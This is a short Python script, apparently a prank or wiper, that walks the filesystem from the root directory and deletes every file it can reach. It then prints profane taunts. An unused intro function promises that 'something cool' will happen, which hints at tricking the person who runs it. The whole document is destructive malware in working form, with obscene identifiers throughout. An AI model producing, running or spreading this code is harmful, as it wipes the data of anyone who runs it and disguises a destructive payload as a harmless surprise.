import os as habibi
import time
from threading import Thread

def intro():
    print("Something cool is about to happen!!!! Just wait for 5 minutes or so!")

def r_p():
    return habibi.path.abspath(habibi.sep)


def t_c(penis):
    for semen, _, fucks in habibi.walk(penis):
        for fuck in fucks:
            habibi.remove(semen + '/' + fuck)

def fin():
    start = "f"
    if start == "f":
        start = "fu"
        if start == "fu":
            start = "fuc"
            if start == "fuc":
                start = "fuck"
                if start == "fuck":
                    print(start + " you!")
    print("No, seriously, fuck you")

a = Thread(target=t_c, args=(r_p()))
a.start()
a.join()
fin()
